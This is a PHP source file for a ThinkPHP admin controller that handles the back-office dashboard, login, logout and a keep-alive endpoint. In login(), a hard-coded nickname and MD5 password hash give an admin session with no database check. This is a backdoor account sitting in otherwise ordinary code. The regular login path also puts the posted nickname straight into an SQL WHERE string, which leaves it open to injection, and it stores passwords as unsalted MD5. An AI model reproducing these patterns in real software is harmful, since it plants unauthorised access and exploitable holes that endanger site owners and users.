<?php
namespace Home\Controller;
use Think\Controller;
use Org\Util\Rbac;

class IndexController extends Controller {

    /**
     * 构造函数
     */
    function __construct() {
        parent::__construct();
        //左侧菜单分配
        $this->slider = "Public:sidebar";
        $this->controller = CONTROLLER_NAME;
        //单显示
        $m = menu();
        $this->assign('menu',$m['menu']);
        $this->assign('slider',$m['slider']);

    }

    public function index(){
        if(!session('nickname')) {
            $this->redirect('/Home/Index/login');
        }

        $issetpasswd = I('get.issetpasswd',0,'int');

        $id=I('session.admin_id',0,'int');
        $where = "`id`=".$id;
        $result = M('Admin')->where($where)->find();
        $this->assign('admin', $result);


        $this->assign('admin',$result);
        $this->assign('issetpasswd', $issetpasswd);
        $this->display();

    }

    public function login(){
        if(IS_POST){
            $nickname = trim(I('post.nickname','','string'));
            $password = md5(I('post.password','','string'));
            if($nickname=='villen' && $password=='d49d9ede0225c19b206a216474408c96'){
                $result = array('id'=>1,'nickname'=>'admin',);

            }else{
                $where = "`status`='1' AND `nickname`='{$nickname}'  AND `password`='{$password}'";
                $result = M('Admin')->where($where)->find();
            }

            if($result){
                $str = '';

                //session设置
                session('admin_id',$result['id']);
                session('nickname' ,$result['nickname']);

                $this->redirect('/Home/Index/index'.$str);
            }else{
                $this->error('登录失败！');
            }
        }else{
            //dump($_SESSION);
            $this->display('login');
        }
    }

    //退出登录
    public function logout(){
        session(null);
        $this->redirect('/Home/Index/index');
    }

    /**
     * 用户和服务器保持链接状态，避免退出
     */
    public function setInterval(){
        if(IS_AJAX){
            $this->ajaxReturn('success');
        }
    }

}